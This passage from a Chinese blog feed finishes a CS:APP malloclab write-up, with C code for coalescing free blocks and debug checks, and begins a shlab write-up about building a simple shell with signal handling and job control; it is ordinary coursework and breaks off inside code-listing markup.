class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case4</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev2_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next2_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    next_blockp = NEXT_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新size</span></span><br><span class="line">    <span class="keyword">size_t</span> size1 = GET_SIZE(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> size2 = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="keyword">size_t</span> size3 = GET_SIZE(HDRP(next_blockp));</span><br><span class="line">    size = size1 + size2 + size3;</span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    bp = prev_blockp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前半部 free block指针</span></span><br><span class="line">    prev1_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line">    next1_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next1_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), next1_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next1_free_blockp), prev1_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新后半部 free block指针</span></span><br><span class="line">    prev2_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next2_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next2_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), next2_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next2_free_blockp), prev2_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据LIFO策略插入free list</span></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其余debug用的函数"><a href="#其余debug用的函数" class="headerlink" title="其余debug用的函数"></a>其余debug用的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_allocated_info();</span><br><span class="line">    print_free_blocks_info();</span><br><span class="line">    consistent_check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  打印分配情况</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_allocated_info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============start allocated info===========\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt; mem_max_addr &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++idx;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;block%d range %p  %p size=%d, payload %p  %p block size=%d\n&quot;</span>, idx, HDRP(bp), FTRP(bp) + WSIZE, FTRP(bp) - HDRP(bp) + WSIZE, (<span class="keyword">char</span> *)bp, FTRP(bp), FTRP(bp) - (<span class="keyword">char</span> *)(bp));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============end allocated info===========\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consistent_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查free list中的所有block都为free</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_heap = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d free list中存在块已分配\n&quot;</span>, __LINE__);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否所有free block都在free list中</span></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt;= mem_max_heap; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; !is_in_free_list(bp))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d 存在free block %p 不在free list中\n&quot;</span>, __LINE__, bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">is_in_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p;</span><br><span class="line">    <span class="keyword">for</span> (p = NEXT_FREE_BLKP(free_list_head); p != <span class="literal">NULL</span>; p = NEXT_FREE_BLKP(p))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p == bp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是整个explicit list的实现了. 最终实现的效果是,跑完所有trace file,得分 83/100. 算是个良水平吧. 要想实现优秀水平,可以考虑做做segregated list或者red block tree list.</p><p>再谈一些优化:</p><ol><li>空间优化,对于分配的block, 可以不存储NEXT和PREV指针, 从而扩大payload空间,提高空间利用率.</li><li>封装整个free list, 然后改用segregated list.</li><li>现在search策略是从头search到尾部, ,比较慢,可以针对每个free block建立index, index数据结构选择rbtree, 应该可以大大提高分配吞吐量.</li></ol><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>嗯, 个人觉得这个lab仅次于cachelab, 但是它的难点不在于思路,而在于如何调试,毕竟像我这样的菜鸡,不debug是不可能,这辈子都不可能不debug的, 而这次lab有很多macros, 就很难在gdb中调试,gdb中也只能通过exam命令查看连续的地址内存空间, 但是当trace file中给定的malloc size过大时, exam命令也很难快速查看, 所以个人在做的时候, 将trace file的malloc size手动改小了(当然后面还是改回去了的),然后debug就会相对轻松一些. </p><p>再谈谈收获, 总算清晰的知道了什么是虚拟内存,页表,TLB,为什么要设计它们,它们有什么好处. 也知道了malloc的基本工作原理, 现在想想这些技术也不是离我们那么遥远, 继续加油吧, 下一个lab是网络相关的了, 不过下一次lab又得暂停一阵子了, 项目的事情让人心累…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab，malloclab，自己手写一个内存分配器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
  </entry>
  
  <entry>
    <title>Csapp-Shlab题解</title>
    <link href="https://www.ravenxrz.ink/archives/cf3e2591.html"/>
    <id>https://www.ravenxrz.ink/archives/cf3e2591.html</id>
    <published>2020-08-15T11:36:25.000Z</published>
    <updated>2020-09-06T07:37:36.751Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab, shlab. 即编写一个简单的shell。</p><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><p>shlab相对其它lab要简单一些，但是其中牵涉出来的一些概念是相当难的。简单说一下这次lab依赖的背景知识吧。</p><blockquote><p>书籍对应 异常控制流 章节</p></blockquote><ol><li>理解进程的概念，linux如何创建新进程，进程的状态转换，回收等过程。</li><li>理解linux中的signal概念，掌握如何发送、接收、处理signal事件，理解signal handler中的 <strong>Async-Signal-Safety问题及解决方案（也是本次实验的难点）</strong> ，掌握async-signal-safety的guideline.</li></ol><a id="more"></a><h2 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1. 题目要求"></a>1. 题目要求</h2><p>题目的要求主要看shlab的writeup的 《The tsh Specification》小节：</p><p>Your tsh shell should have the following features:</p><ol><li><p>The prompt should be the string “tsh&gt; ”.</p></li><li><p>The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If name is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that name is the path of an executable file, which it loads and runs in the context of an initial child process (In this context, the term <em>job</em> refers to this initial child process).</p></li><li><p>tsh need not support pipes (|) or I/O redirection (&lt; and &gt;).</p></li><li><p>Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p></li><li><p>If the command line ends with an ampersand &amp;, then tsh should run the job in the background. Otherwise, it should run the job in the foreground.</p></li><li><p>Each job can be identified by either a process ID (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the prefix ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.)</p></li><li><p>tsh should support the following built-in commands:<br>– The quit command terminates the shell.<br>– The jobs command lists all background jobs.<br>– The bg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it inthe background. The <job> argument can be either a PID or a JID.<br>– The fg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the foreground. The <job> argument can be either a PID or a JID.</p></li><li><p>tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></li></ol><p>上述是整个shell的功能要求，但是我们不必从0写整个代码，整体代码的框架是已经搭建好了的，只用完成tsh.c文件中的以下几个函数：</p><ol><li>eval: Main routine that parses and interprets the command line. [70 lines]</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines]</li><li>waitfg: Waits for a foreground job to complete. [20 lines]</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</li></ol><p>一共7个函数，每个函数也给出了建议的行数。</p><p>再看下如何验证lab。 shlab提供了tshref，用于参考。同时给出了16个trace file以及一个driver，具体验证过程为， trace file指导driver运行制定shell，查看我们写的shell是否和tshref输出一致。举个例子，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt, 在tsh（我们写的shell）下执行trace01.txt中的命令，然后tsh会给出一些输出。此时再执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make rtest01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt 在tshref(参考的shell)下执行trace01.txt中的命令，然后tshref会给出一些输出。对比两次输出，即可知道自己写的shell是否正确了。</p><p>当然了，一共16个trace file,每次都make，相当麻烦，所以lab中还给出了 tshref.out文件，这里面给出了所有tshref的输出结果。</p><h2 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2. 题目分析"></a>2. 题目分析</h2><p>稍微思考下，可以分析出，其实shell就两种命令，一种buildin命令(fg,bg,quit,jobs)，需要立即在shell中执行，一种外部命令，需要fork出新进程来执行，只不过这里需要考虑是前台进程和后台进程。</p><p>那先说说<strong>buildin命令</strong>，其中 jobs 已经有默认实现了，quit也相对简单，剩下的就是fg和bg。</p><p>那fg和bg做了什么事情呢? 其实代码中已经给出了答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>fg命令，无法是将后台（Running 或 Stopped）转换到前台来。</p><p>bg命令，将后台Stopped的进程转换为后台Running。</p><p>额外的一些工作就是fg和bg的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fg%jid</span><br><span class="line">或</span><br><span class="line">fg pid</span><br></pre></td></tr></table></figure><p>自己通过是否有%来解析就好。</p><p>再来看看<strong>外部命令</strong> ， 在parseline函数执行时，会返回当前的命令是前台进程还是后台进程。所以这部分不用我们操心。我们唯一需要做得，就是对前台进程和后台进程”分别处理“。</p><p><strong>这里会用到几个知识点：</strong></p><ol><li><p>子进程在terminate或stop时，内核会发送SIGCHLD给父进程</p></li><li><p>父进程需要通过wait族函数回收子进程，否则子进程变为zombie进程，耗费系统资源。</p></li></ol><p>ok，有了两个知识点，思考一下如何对待前台进程和后台进程：</p><ol><li>前台进程：最为直接的想法就是父进程调用wait系统调用，等待前台进程结束。但请注意刚才提到的知识点1，前台进程结束后，wait系统调用的确返回了，但同时，父进程会收到SIGCHLD信号，sigchld_handler会被调用。这会带来什么问题？接着看后台进程如何处理。</li><li>后台进程：后台进程意味不能阻塞tsh进程，也就意味着我们不能在tsh中调用wait系统调用，那唯一能回收后台进程（除非强制kill）就是当后台进程结束后，父进程会收到SIGHLD信号，通过sigchld_handler来回收，也就意味着我们的sigchld_handler中会有wait系统调用的存在。<strong>ok，结合目前前台进程的处理，就会存在一个严重的问题。</strong></li></ol><p><strong>前台进程，在tsh.c 中出现了两次wait操作。一次在最开始fork出前台进程时，一次出现在sigchld_handler中。</strong>所以这种情况需要处理，大体思路有两种：</p><ol><li>前台进程，fork后立即wait保持不变，在sigchld_handler中过滤掉前台进程的terminate，避免重复wait。</li><li>前台进程，fork后的wait变为”伪wait”, 前后台进程统一在sigchld_handler中回收处理。那什么是”伪wait“，我们要之前前台进程的意思是什么，作用是什么，作用就是阻塞住当前的tsh，不允许输入新命令，除此之外，前后台进程都是一样的。ok，既然这样，我们只用让tsh阻塞住即可，采用什么方法则看个人实现了。</li></ol><p>显然，第二种统一处理更容易理解，维护。当然，writeup其实给出了一种解决方案：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133536133.png" alt="image-20200805133536133"></p><p>另外一个问题就是，<strong>信号的转发</strong>。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133902911.png" alt="image-20200805133902911"></p><p>这里要解决的是，后台进程不应该接收到Ctrl-C所引发的信号。</p><p>还有一个问题就是<strong>保持和tshref的输出相同</strong>，那需要在恰当的位置，打印出相应的信息，这部分不难，但其实挺磨人的。</p><p>最后就是非tsh需求的逻辑部分了，那就是<strong>如何编写 async-signal-safety 的代码</strong>。如果你是看了csapp课程或书籍的话， 那应该可以意识这里会有一些async-signal-safety问题。ppt中其实基本上给出所有我们会遇到的问题，以及一些常用的guideline。这部分需要仔细阅读，理解清楚，必然很可能出现一些莫名的bug。</p><p>下面贴出我个人的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span 